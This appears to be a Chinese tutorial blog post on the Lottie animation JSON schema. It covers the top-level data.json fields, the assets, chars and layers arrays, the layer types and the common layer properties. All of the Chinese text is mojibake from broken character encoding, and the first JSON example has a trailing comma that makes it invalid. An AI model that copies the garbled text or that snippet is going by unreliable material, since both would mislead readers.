i::selection,.markdown-body strong::selection{background-color:var(--cyanosis-slct-elbg-color)}.markdown-body del::selection{color:var(--cyanosis-slct-del-color);background-color:var(--cyanosis-slct-elbg-color)}.markdown-body table thead th::selection{background-color:transparent}.markdown-body table tbody td::selection{background-color:var(--cyanosis-slct-bg-color)}.markdown-body code::selection{background-color:var(--cyanosis-slct-codebg-color)}.markdown-body pre&gt;code::selection{background-color:var(--cyanosis-slct-prebg-color)}.markdown-body .contains-task-list{padding-left:14px;list-style:none}.markdown-body .contains-task-list input[type=checkbox]{position:relative}.markdown-body .contains-task-list input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1}.markdown-body .contains-task-list input[type=checkbox]:checked:after{content:"âœ“";position:absolute;top:-12px;left:0;right:0;bottom:0;width:0;height:0;color:#f55;font-size:20px;font-weight:700;z-index:2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="a11y-dark">.hljs-comment,.hljs-quote{color:#d4d0ab}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#ffa07a}.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#f5ab35}.hljs-attribute{color:gold}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:#abe338}.hljs-section,.hljs-title{color:#00e0e0}.hljs-keyword,.hljs-selector-tag{color:#dcc6e0}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#2b2b2b;color:#f8f8f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}@media screen and (-ms-high-contrast:active){.hljs-addition,.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-comment,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-quote,.hljs-string,.hljs-symbol,.hljs-type{color:highlight}.hljs-keyword,.hljs-selector-tag{font-weight:700}}</style><p>Lottie çš„æœ¬è´¨æ˜¯Â <strong>After Effects åŠ¨ç”»çš„ Web æ’­æ”¾å™¨</strong>ï¼Œå…¶å·¥ä½œæµç¨‹æ¸…æ™°ç®€æ´ï¼š</p>
<ol>
<li><strong>è®¾è®¡</strong>Â â†’ è®¾è®¡å¸ˆåœ¨ <strong>After Effectsï¼ˆAEï¼‰</strong> ä¸­åˆ¶ä½œçŸ¢é‡åŠ¨ç”»</li>
<li><strong>å¯¼å‡º</strong>Â â†’ é€šè¿‡ Bodymovin æ’ä»¶å°†åŠ¨ç”»å¯¼å‡ºä¸ºè½»é‡çš„Â <code>data.json</code>Â æ–‡ä»¶</li>
<li><strong>æ’­æ”¾</strong>Â â†’ web å¼€å‘è€…ä½¿ç”¨Â <code>lottie-web</code>Â åº“è§£æè¯¥ JSONï¼Œå¹¶åœ¨æµè§ˆå™¨ä¸­å®æ—¶æ¸²æŸ“åŠ¨ç”»</li>
</ol>
<p>è‹¥æƒ³æ·±å…¥ç†è§£ Lottie çš„åŠ¨ç”»æœºåˆ¶ï¼Œä»Â <strong>JSON Schema</strong>Â å…¥æ‰‹æ˜¯ä¸€æ¡æ¸…æ™°çš„è·¯å¾„ã€‚Lottie æ˜¯ä¸€ä¸ªå®Œå…¨ç”±æ•°æ®é©±åŠ¨çš„åŠ¨ç”»ç³»ç»Ÿï¼ŒæŒæ¡å…¶ JSON ç»“æ„ï¼Œå°±ç­‰äºæ¡ä½äº†ç†è§£åŠ¨ç”»æ¸²æŸ“é€»è¾‘çš„é’¥åŒ™ã€‚å½“ç„¶ï¼ŒLottie JSON çš„é…ç½®é¡¹è¾ƒä¸ºä¸°å¯Œï¼Œä¸å¿…è¿½æ±‚ä¸€æ¬¡æ€§å…¨éƒ¨è®°ä½ã€‚æœ¬æ–‡æ—¨åœ¨å¸®åŠ©å¤§å®¶å»ºç«‹åˆæ­¥è®¤çŸ¥ï¼Œä¸ºåç»­å­¦ä¹ æ¸²æŸ“å¼•æ“æ‰“ä¸‹åŸºç¡€ï¼Œåšåˆ°â€œçŸ¥å…¶ç„¶ï¼Œäº¦çŸ¥å…¶æ‰€ä»¥ç„¶â€ã€‚</p>
<h2 data-id="heading-0"><strong>ä¸€ã€åˆè¯† data.json ï¼šåŠ¨ç”»æ•°æ®çš„é¡¶å±‚ç»“æ„</strong></h2>
<p>Lottie åŠ¨ç”»çš„æœ¬è´¨æ˜¯ä¸€å¥—<strong>ç”±æ•°æ®é©±åŠ¨çš„å›¾å½¢ç»˜åˆ¶æŒ‡ä»¤é›†</strong>ï¼Œè€ŒÂ <code>data.json</code>Â æ–‡ä»¶æ­£æ˜¯è¿™å¥—æŒ‡ä»¤çš„å®Œæ•´è½½ä½“ã€‚å…¶<strong>é¡¶å±‚ç»“æ„</strong>å®šä¹‰äº†åŠ¨ç”»çš„å…¨å±€å…ƒä¿¡æ¯ï¼Œå¦‚åŒç”µå½±çš„â€œå¯¼æ¼”å°æœ¬â€ï¼Œè®¾å®šäº†åŠ¨ç”»æ’­æ”¾çš„<strong>ç”»å¸ƒå°ºå¯¸ã€æ—¶é—´çº¿ä¸åŸºç¡€ç¯å¢ƒ</strong>ã€‚ç†è§£è¿™äº›å­—æ®µï¼Œæ˜¯åç»­æ·±å…¥è§£æå›¾å±‚ã€å…³é”®å¸§ç­‰å¤æ‚å±æ€§çš„æ ¹åŸºã€‚</p>
<h3 data-id="heading-1"><strong>é¡¶å±‚å…ƒæ•°æ®ï¼šåŠ¨ç”»çš„å…¨å±€å®šä¹‰</strong></h3>
<p>ä¸‹è¡¨åˆ—å‡ºäº†Â <code>data.json</code>Â æ ¹å¯¹è±¡ï¼ˆRoot Objectï¼‰ä¸­çš„æ ¸å¿ƒå…ƒæ•°æ®å­—æ®µï¼Œå®ƒä»¬å…±åŒæ¡†å®šäº†åŠ¨ç”»çš„æ—¶ç©ºå±æ€§ä¸æ¸²æŸ“åŸºç¡€ã€‚</p>




































































<table><thead><tr><th>å­—æ®µ</th><th>ç±»å‹</th><th>æè¿°</th><th>ç¤ºä¾‹å€¼</th><th>å•ä½/å¤‡æ³¨</th></tr></thead><tbody><tr><td><strong>v</strong></td><td><code>string</code></td><td><strong>Bodymovin æ’ä»¶ç‰ˆæœ¬</strong>ï¼šç”Ÿæˆæ­¤ JSON æ‰€ç”¨çš„æ’ä»¶ç‰ˆæœ¬å·ï¼Œä¸åŒç‰ˆæœ¬å¯èƒ½æ”¯æŒä¸åŒçš„ç‰¹æ€§ã€‚</td><td><code>"5.7.4"</code></td><td>-</td></tr><tr><td><strong>fr</strong></td><td><code>number</code></td><td><strong>å¸§ç‡ï¼ˆFrame Rateï¼‰</strong> ï¼šåŠ¨ç”»çš„æ’­æ”¾é€Ÿç‡ï¼Œç›´æ¥å†³å®šåŠ¨ç”»çš„æµç•…åº¦ä¸æ—¶é—´è®¡ç®—åŸºå‡†ã€‚</td><td><code>30</code>,Â <code>60</code></td><td>å¸§/ç§’ (fps)</td></tr><tr><td><strong>ip</strong></td><td><code>number</code></td><td><strong>èµ·å§‹å¸§ï¼ˆIn Pointï¼‰</strong> ï¼šåŠ¨ç”»æ—¶é—´è½´å¼€å§‹çš„ç»å¯¹å¸§ç¼–å·ã€‚</td><td><code>0</code></td><td>å¸§</td></tr><tr><td><strong>op</strong></td><td><code>number</code></td><td><strong>ç»“æŸå¸§ï¼ˆOut Pointï¼‰</strong> ï¼šåŠ¨ç”»æ—¶é—´è½´ç»“æŸçš„ç»å¯¹å¸§ç¼–å·ã€‚åŠ¨ç”»æ€»æ—¶é•¿ =Â <code>(op - ip) / fr</code>Â ç§’ã€‚</td><td><code>90</code></td><td>å¸§</td></tr><tr><td><strong>w</strong></td><td><code>number</code></td><td><strong>ç”»å¸ƒå®½åº¦</strong>ï¼šåŠ¨ç”»åˆæˆï¼ˆCompositionï¼‰çš„é€»è¾‘å®½åº¦ã€‚</td><td><code>800</code></td><td>åƒç´  (px)</td></tr><tr><td><strong>h</strong></td><td><code>number</code></td><td><strong>ç”»å¸ƒé«˜åº¦</strong>ï¼šåŠ¨ç”»åˆæˆçš„é€»è¾‘é«˜åº¦ã€‚</td><td><code>600</code></td><td>åƒç´  (px)</td></tr><tr><td><strong>nm</strong></td><td><code>string</code></td><td><strong>åˆæˆåç§°ï¼ˆNameï¼‰</strong> ï¼šå¯¹åº” After Effects ä¸­åˆæˆçš„åç§°ï¼Œä¾¿äºè¯†åˆ«ã€‚</td><td><code>"å…ƒæ•°æ®æ¼”ç¤ºåŠ¨ç”»"</code></td><td>-</td></tr><tr><td><strong>ddd</strong></td><td><code>integer</code></td><td><strong>3D å›¾å±‚æ ‡è¯†</strong>ï¼šæ ‡è¯†æ­¤åˆæˆä¸­<strong>æ˜¯å¦åŒ…å« 3D å›¾å±‚æˆ–æ‘„åƒæœº</strong>ã€‚<code>0</code>Â ä»£è¡¨å¦ï¼ˆé»˜è®¤ï¼‰ï¼Œ<code>1</code>Â ä»£è¡¨æ˜¯ã€‚</td><td><code>0</code></td><td>-</td></tr></tbody></table>
<p>ç»¼åˆä»¥ä¸Šå­—æ®µï¼Œä¸€ä¸ªå®šä¹‰äº†800x600ç”»å¸ƒã€30fpsã€æ—¶é•¿3ç§’çš„2DåŠ¨ç”»ï¼Œå…¶é¡¶å±‚ç»“æ„ç¤ºä¾‹å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"v"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"5.7.4"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"fr"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">30</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"ip"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"op"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">90</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"w"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">800</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"h"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">600</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"nm"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"å…ƒæ•°æ®æ¼”ç¤ºåŠ¨ç”»"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"ddd"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h3 data-id="heading-2"><strong>æ ¸å¿ƒç»„æˆï¼šå›¾å±‚ã€èµ„æºä¸å­—å½¢</strong></h3>
<p><code>assets</code>ã€<code>chars</code>Â ä¸Â <code>layers</code>Â æ˜¯æ„æˆ Lottie åŠ¨ç”»å†…å®¹çš„ä¸‰ä¸ªæ ¸å¿ƒæ•°æ®æ•°ç»„ã€‚å®ƒä»¬åˆ†åˆ«å®šä¹‰äº†å¯å¤ç”¨çš„ç´ æã€çŸ¢é‡å­—å½¢ä»¥åŠå›¾å±‚çš„åºåˆ—ä¸å±æ€§ï¼Œå…±åŒæè¿°äº†åŠ¨ç”»çš„å…¨éƒ¨è§†è§‰ä¿¡æ¯ä¸åŠ¨æ€è¡Œä¸ºã€‚</p>
<h4 data-id="heading-3"><strong><code>assets</code>Â - å¯å¤ç”¨èµ„æºåº“</strong></h4>
<p><code>assets</code>Â æ•°ç»„ç”¨äºé›†ä¸­å®šä¹‰åŠ¨ç”»ä¸­å¯è¢«å¤šæ¬¡å¼•ç”¨çš„é™æ€æˆ–åŠ¨æ€èµ„æºã€‚æ­¤è®¾è®¡å®ç°äº†èµ„æºå¤ç”¨ï¼Œæœ‰åŠ©äºä¼˜åŒ–æ–‡ä»¶ä½“ç§¯å¹¶ä¿è¯å¼•ç”¨çš„ä¸€è‡´æ€§ã€‚</p>


























<table><thead><tr><th>èµ„æºç±»å‹</th><th>ç±»å‹æ ‡è¯† (<code>ty</code>)</th><th>å†…å®¹æè¿°</th><th>å¼•ç”¨å­—æ®µ</th><th>ä¸»è¦ç”¨é€”</th></tr></thead><tbody><tr><td><strong>å›¾åƒèµ„æº</strong></td><td><code>"img"</code></td><td>åŒ…å«å›¾åƒIDã€å°ºå¯¸åŠæ–‡ä»¶è·¯å¾„æˆ–Base64ç¼–ç æ•°æ®ã€‚</td><td><code>refId</code></td><td>é™æ€ä½å›¾å…ƒç´ ï¼Œå¦‚å›¾æ ‡ã€èƒŒæ™¯ã€‚</td></tr><tr><td><strong>é¢„åˆæˆèµ„æº</strong></td><td><code>"precomp"</code></td><td>ä¸€ä¸ªå®Œæ•´çš„å­åˆæˆï¼ŒåŒ…å«ç‹¬ç«‹çš„å›¾å±‚(<code>layers</code>)ä¸æ—¶é—´è½´ã€‚</td><td><code>refId</code></td><td>å¯é‡å¤ä½¿ç”¨çš„åŠ¨ç”»ç‰‡æ®µï¼Œå¦‚é€šç”¨åŠ¨æ•ˆç»„ä»¶ã€‚</td></tr></tbody></table>
<p><strong>å¼•ç”¨æœºåˆ¶</strong>ï¼šå›¾å±‚é€šè¿‡å…¶Â <code>refId</code>Â å±æ€§ä¸Â <code>assets</code>Â ä¸­å¯¹åº”IDçš„èµ„æºè¿›è¡Œå…³è”ã€‚æ¸²æŸ“æ—¶ï¼Œå¼•æ“æ®æ­¤æŸ¥æ‰¾å¹¶ç»˜åˆ¶ç›¸åº”èµ„æºã€‚</p>
<h4 data-id="heading-4"><strong><code>chars</code>Â - çŸ¢é‡å­—å½¢å®šä¹‰</strong></h4>
<p><code>chars</code>Â æ•°ç»„å­˜å‚¨äº†å°†æ–‡å­—è½¬æ¢ä¸ºçŸ¢é‡å½¢çŠ¶åçš„æ•°æ®ã€‚å½“åŠ¨ç”»éœ€è¦å¯¹æ–‡å­—è¿›è¡Œè·¯å¾„å˜å½¢ã€æè¾¹åŠ¨ç”»ç­‰è¶…è¶Šæ™®é€šæ–‡æœ¬æ¸²æŸ“èƒ½åŠ›çš„æ“ä½œæ—¶ï¼Œä¼šä½¿ç”¨æ­¤æ•°ç»„ã€‚</p>
<ul>
<li><strong>äº§ç”Ÿæ¡ä»¶</strong>ï¼šåœ¨After Effectsä¸­å¯¹æ–‡æœ¬å›¾å±‚æ‰§è¡Œâ€œä»æ–‡å­—åˆ›å»ºå½¢çŠ¶â€ï¼Œæˆ–åœ¨å¯¼å‡ºæ—¶å¯ç”¨â€œå­—ç¬¦å½¢çŠ¶â€é€‰é¡¹ã€‚</li>
<li><strong>æ•°æ®ç»“æ„</strong>ï¼šæ¯ä¸ªé¡¹å®šä¹‰äº†å­—ç¬¦ã€å­—ä½“ä¿¡æ¯åŠå…¶çŸ¢é‡è·¯å¾„(<code>data</code>)ï¼Œè¯¥è·¯å¾„æ•°æ®åŒ…å«è½®å»“ã€æè¾¹ä¸å¡«å……ç­‰å±æ€§ã€‚</li>
<li><strong>æ ¸å¿ƒç”¨é€”</strong>ï¼šå®ç°å¯¹æ–‡å­—å­—ç¬¦çš„ç²¾ç»†åŒ–æ§åˆ¶ï¼Œç”¨äºåˆ¶ä½œå­—å½¢å˜å½¢ã€ç¬”ç”»åŠ¨ç”»ç­‰æ•ˆæœã€‚</li>
</ul>
<h4 data-id="heading-5"><strong><code>layers</code>Â - åŠ¨ç”»å›¾å±‚åºåˆ—</strong></h4>
<p><code>layers</code>Â æ˜¯ä¸€ä¸ªæœ‰åºæ•°ç»„ï¼Œå®šä¹‰äº†æ‰€æœ‰å›¾å±‚çš„å åŠ é¡ºåºã€åŸºæœ¬å±æ€§åŠå…³é”®å¸§åŠ¨ç”»ã€‚å®ƒæ˜¯ç»„ç»‡åŠ¨ç”»æ¸²æŸ“é€»è¾‘çš„ä¸»ä½“ã€‚</p>
<ul>
<li><strong>æ¸²æŸ“é¡ºåº</strong>ï¼šæ•°ç»„ç´¢å¼•ä»0å¼€å§‹ï¼Œå›¾å±‚æŒ‰ç´¢å¼•å‡åºä»åº•å±‚åˆ°é¡¶å±‚ä¾æ¬¡æ¸²æŸ“ã€‚</li>
<li><strong>æ ¸å¿ƒå±æ€§</strong>ï¼šæ¯ä¸ªå›¾å±‚å¯¹è±¡åŒ…å«ç±»å‹ï¼ˆå¦‚å½¢çŠ¶ã€å›¾åƒã€æ–‡æœ¬ï¼‰ã€ç©ºé—´å˜æ¢å±æ€§ã€è’™ç‰ˆä»¥åŠå…³é”®å¸§åŠ¨ç”»æ•°æ®ã€‚</li>
<li><strong>å…³é”®ä½œç”¨</strong>ï¼š<code>assets</code>Â å’ŒÂ <code>chars</code>Â ä¸­å®šä¹‰çš„èµ„æºéœ€åœ¨æ­¤è¢«å¼•ç”¨ï¼Œå¹¶é€šè¿‡å›¾å±‚çš„åŠ¨ç”»å±æ€§é©±åŠ¨ï¼Œæ‰èƒ½æˆä¸ºæœ€ç»ˆåŠ¨ç”»çš„ä¸€éƒ¨åˆ†ã€‚</li>
</ul>
<p><strong>åä½œå…³ç³»</strong>ï¼š<code>assets</code>Â å’ŒÂ <code>chars</code>Â ä½œä¸ºèµ„æºå®šä¹‰ï¼Œä¸ºÂ <code>layers</code>Â æä¾›ç´ æï¼›<code>layers</code>Â åˆ™è´Ÿè´£ç»„ç»‡è¿™äº›ç´ æï¼Œå¹¶é€šè¿‡å…¶æ—¶é—´è½´å’Œå±æ€§æ§åˆ¶åŠ¨ç”»çš„æœ€ç»ˆè¡¨ç°ã€‚ä¸€ä¸ªå®Œæ•´çš„ç»“æ„ç¤ºä¾‹å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"v"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"5.7.4"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"fr"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">30</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"ip"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"op"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">90</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"w"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">800</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"h"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">600</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"nm"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"å…ƒæ•°æ®æ¼”ç¤ºåŠ¨ç”»"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"ddd"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"assets"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"layers"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"chars"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<hr/>
<h2 data-id="heading-6"><strong>äºŒã€å›¾å±‚ç³»ç»Ÿ - ç†è§£ Layers ç»“æ„</strong>â­ï¸</h2>
<p><code>layers</code> æ•°ç»„æ˜¯ Lottie JSON ä¸­æ‰¿è½½æ‰€æœ‰åŠ¨ç”»å›¾å±‚ä¿¡æ¯çš„ä¸»ä½“ã€‚å®ƒå®šä¹‰äº†å›¾å±‚çš„å †å é¡ºåºã€å±æ€§åŠå…³é”®å¸§åŠ¨ç”»ï¼Œæ˜¯æ„æˆåŠ¨ç”»è§†è§‰å‘ˆç°ä¸åŠ¨æ€è¡Œä¸ºçš„æ ¸å¿ƒæ•°æ®ç»“æ„ã€‚Lottie ä¸»è¦åŒ…å«ä»¥ä¸‹å…­ç§åŸºç¡€å›¾å±‚ç±»å‹ï¼š</p>








































<table><thead><tr><th>ç±»å‹æ ‡è¯† (<code>ty</code>)</th><th>å›¾å±‚ç±»å‹</th><th>æ ¸å¿ƒæè¿°</th></tr></thead><tbody><tr><td><strong>0</strong></td><td><strong>é¢„åˆæˆå›¾å±‚ (Precomp Layer)</strong></td><td>åµŒå¥—åˆæˆå±‚ï¼Œé€šè¿‡ <code>refId</code> å¼•ç”¨ <code>assets</code> ä¸­å®šä¹‰çš„é¢„åˆæˆèµ„æºï¼Œå®ç°åŠ¨ç”»å¤ç”¨ä¸æ¨¡å—åŒ–ç®¡ç†ã€‚</td></tr><tr><td><strong>1</strong></td><td><strong>çº¯è‰²å›¾å±‚ (Solid Layer)</strong></td><td>çº¯è‰²å¡«å……å±‚ï¼Œå®šä¹‰å›ºå®šé¢œè‰²çš„çŸ©å½¢åŒºåŸŸï¼Œå¸¸ç”¨ä½œèƒŒæ™¯æˆ–é®ç½©ã€‚</td></tr><tr><td><strong>2</strong></td><td><strong>å›¾åƒå›¾å±‚ (Image Layer)</strong></td><td>é™æ€å›¾ç‰‡å±‚ï¼Œé€šè¿‡ <code>refId</code> å¼•ç”¨ <code>assets</code> ä¸­å®šä¹‰çš„å›¾åƒèµ„æºã€‚</td></tr><tr><td><strong>3</strong></td><td><strong>ç©ºå¯¹è±¡å›¾å±‚ (Null Layer)</strong></td><td>ä¸å¯è§è¾…åŠ©å±‚ï¼Œä¸»è¦ç”¨äºé€šè¿‡å…¶ <code>ks</code> å±æ€§ï¼ˆå˜æ¢æ•°æ®ï¼‰é©±åŠ¨å­å›¾å±‚åŠ¨ç”»ï¼Œæˆ–ä½œä¸ºåŠ¨ç”»æ§åˆ¶å™¨ã€‚</td></tr><tr><td><strong>4</strong></td><td><strong>å½¢çŠ¶å›¾å±‚ (Shape Layer)</strong></td><td>çŸ¢é‡å›¾å½¢å±‚ï¼Œç”±è·¯å¾„ã€æè¾¹ã€å¡«å……ç­‰å±æ€§æ„æˆï¼Œæ˜¯åˆ¶ä½œå˜å½¢ã€è·¯å¾„åŠ¨ç”»çš„åŸºç¡€ã€‚</td></tr><tr><td><strong>5</strong></td><td><strong>æ–‡æœ¬å›¾å±‚ (Text Layer)</strong></td><td>æ–‡å­—å›¾å±‚ï¼Œå¯å®šä¹‰å­—ä½“ã€é¢œè‰²ã€æ®µè½æ ·å¼ï¼Œå¹¶æ”¯æŒé€å­—ç¬¦åŠ¨ç”»ã€‚</td></tr></tbody></table>
<p>æ‰€æœ‰å›¾å±‚å…±äº«ä¸€ç»„åŸºç¡€å±æ€§ï¼Œç”¨äºå®šä¹‰å…¶åœ¨åˆæˆä¸­çš„åŸºæœ¬çŠ¶æ€ä¸æ—¶ç©ºå…³ç³»ã€‚</p>
<p>ä»¥ä¸‹å±æ€§ä¸º<strong>æ‰€æœ‰å›¾å±‚ç±»å‹</strong>å…±æœ‰çš„åŸºç¡€å±æ€§ï¼š</p>





















































































































<table><thead><tr><th>å±æ€§</th><th>ç±»å‹</th><th>å¿…é€‰</th><th>æè¿°</th><th>ç¤ºä¾‹å€¼</th><th>é»˜è®¤å€¼</th></tr></thead><tbody><tr><td><strong><code>ty</code></strong></td><td><code>number</code></td><td>æ˜¯</td><td><strong>å›¾å±‚ç±»å‹æ ‡è¯†</strong>ï¼Œå†³å®šå›¾å±‚çš„è¡Œä¸ºå’Œæ•°æ®ç»“æ„ï¼ˆè§ä¸Šè¡¨ï¼‰</td><td><code>0</code>-<code>5</code></td><td>-</td></tr><tr><td><strong><code>nm</code></strong></td><td><code>string</code> / <code>number</code></td><td>å¦</td><td><strong>å›¾å±‚åç§°</strong>ï¼Œåœ¨ After Effects ä¸­è®¾ç½®ï¼Œç”¨äºè¡¨è¾¾å¼å’Œè°ƒè¯•</td><td><code>"æŒ‰é’®èƒŒæ™¯"</code>, <code>"Layer 1"</code></td><td>-</td></tr><tr><td><strong><code>ind</code></strong></td><td><code>number</code></td><td>æ˜¯</td><td><strong>å›¾å±‚ç´¢å¼•</strong>ï¼Œåœ¨æ•´ä¸ªåˆæˆä¸­å”¯ä¸€ï¼Œç”¨äºçˆ¶å­å…³è”å’Œè¡¨è¾¾å¼å¼•ç”¨</td><td><code>1</code>, <code>2</code>, <code>3</code></td><td>-</td></tr><tr><td><strong><code>ip</code></strong></td><td><code>number</code></td><td>æ˜¯</td><td><strong>å…¥ç‚¹ (In Point)</strong>ï¼Œå›¾å±‚å¼€å§‹æ˜¾ç¤ºçš„å¸§æ•°</td><td><code>0</code>, <code>30</code></td><td>-</td></tr><tr><td><strong><code>op</code></strong></td><td><code>number</code></td><td>æ˜¯</td><td><strong>å‡ºç‚¹ (Out Point)</strong>ï¼Œå›¾å±‚ç»“æŸæ˜¾ç¤ºçš„å¸§æ•°</td><td><code>90</code>, <code>180</code></td><td>-</td></tr><tr><td><strong><code>st</code></strong></td><td><code>number</code></td><td>æ˜¯</td><td><strong>èµ·å§‹æ—¶é—´ (Start Time)</strong>ï¼Œå›¾å±‚çš„æ—¶é—´åç§»é‡</td><td><code>0</code>, <code>10</code></td><td>-</td></tr><tr><td><strong><code>sr</code></strong></td><td><code>number</code></td><td>å¦</td><td><strong>æ—¶é—´æ‹‰ä¼¸ (Stretch)</strong>ï¼Œæ§åˆ¶å›¾å±‚æ’­æ”¾é€Ÿåº¦çš„ç³»æ•°</td><td><code>1</code> (æ­£å¸¸), <code>0.5</code> (å‡é€Ÿ), <code>2</code> (åŠ é€Ÿ)</td><td><code>1</code></td></tr><tr><td><strong><code>ks</code></strong></td><td><code>object</code></td><td>æ˜¯</td><td><strong>å˜æ¢å±æ€§ (Transform)</strong>ï¼ŒåŒ…å«ä½ç½®ã€ç¼©æ”¾ã€æ—‹è½¬ã€é€æ˜åº¦ç­‰å…³é”®å¸§æ•°æ®</td><td>è§ä¸‹æ–¹è¯¦è§£</td><td>-</td></tr><tr><td><strong><code>ao</code></strong></td><td><code>number</code></td><td>å¦</td><td><strong>è‡ªåŠ¨å®šå‘ (Auto-Orient)</strong>ï¼Œæ²¿è·¯å¾„è‡ªåŠ¨è°ƒæ•´å›¾å±‚æ–¹å‘ï¼ˆå¸ƒå°”å€¼ï¼š0/1ï¼‰</td><td><code>0</code> (å…³é—­), <code>1</code> (å¼€å¯)</td><td><code>0</code></td></tr><tr><td><strong><code>ddd</code></strong></td><td><code>number</code></td><td>å¦</td><td><strong>3D å›¾å±‚æ ‡è¯†</strong>ï¼Œæ ‡è®°è¯¥å›¾å±‚æ˜¯å¦ä¸º 3D å›¾å±‚ï¼ˆå¸ƒå°”å€¼ï¼š0/1ï¼‰</td><td><code>0</code> (2D), <code>1</code> (3D)</td><td><code>0</code></td></tr><tr><td><strong><code>parent</code></strong></td><td><code>number</code></td><td>å¦</td><td><strong>çˆ¶å›¾å±‚ç´¢å¼•</strong>ï¼ŒæŒ‡å‘çˆ¶å›¾å±‚çš„ <code>ind</code> å€¼ï¼Œå®ç°å±‚çº§æ§åˆ¶å’Œè”åŠ¨å˜æ¢</td><td><code>1</code>, <code>5</code></td><td>-</td></tr><tr><td><strong><code>cl</code></strong></td><td><code>string</code></td><td>å¦</td><td><strong>CSS ç±»å (Class)</strong>ï¼Œåœ¨ SVG/HTML æ¸²æŸ“å™¨ä¸­ä½œä¸º HTML class</td><td><code>"background"</code>, <code>"icon"</code></td><td>-</td></tr><tr><td><strong><code>ln</code></strong></td><td><code>string</code></td><td>å¦</td><td><strong>HTML ID</strong>ï¼Œåœ¨ SVG/HTML æ¸²æŸ“å™¨ä¸­ä½œä¸º HTML id å±æ€§</td><td><code>"layer-bg"</code>, <code>"main-icon"</code></td><td>-</td></tr></tbody></table>
<p>ä»¥ä¸Š13ä¸ªé€šç”¨å±æ€§ä¸­ï¼Œæœ‰Â <strong>3ä¸ª</strong>ï¼ˆ<code>ip</code>ã€<code>op</code>ã€<code>nm</code>ï¼‰ä¸æ ¹å¯¹è±¡ä¸­çš„æ¦‚å¿µ<strong>å®Œå…¨ä¸€è‡´</strong>ï¼Œä»…ä½œç”¨åŸŸä¸åŒã€‚<strong>1ä¸ª</strong>ï¼ˆ<code>ddd</code>ï¼‰ä¸æ ¹å¯¹è±¡æ¦‚å¿µ<strong>ç›¸ä¼¼ä½†æœ‰åŒºåˆ«</strong>ï¼šæ ¹å¯¹è±¡çš„Â <code>ddd</code>Â è¡¨ç¤ºåˆæˆâ€œæ˜¯å¦åŒ…å«â€3Då…ƒç´ ï¼Œè€Œå›¾å±‚çš„Â <code>ddd</code>Â è¡¨ç¤ºå…¶â€œæœ¬èº«æ˜¯å¦ä¸ºâ€3Då›¾å±‚ã€‚å…¶ä½™Â <strong>9ä¸ª</strong>ï¼ˆ<code>ty</code>,Â <code>ind</code>,Â <code>st</code>,Â <code>sr</code>,Â <code>ks</code>,Â <code>ao</code>,Â <code>parent</code>,Â <code>cl</code>,Â <code>ln</code>ï¼‰åˆ™æ˜¯<strong>å›¾å±‚ä¸“æœ‰çš„æ ¸å¿ƒå±æ€§</strong>ï¼Œå®ƒä»¬å…±åŒå®šä¹‰äº†å›¾å±‚åœ¨æ—¶é—´ä¸ç©ºé—´ä¸­çš„åŸºæœ¬çŠ¶æ€ã€‚</p>
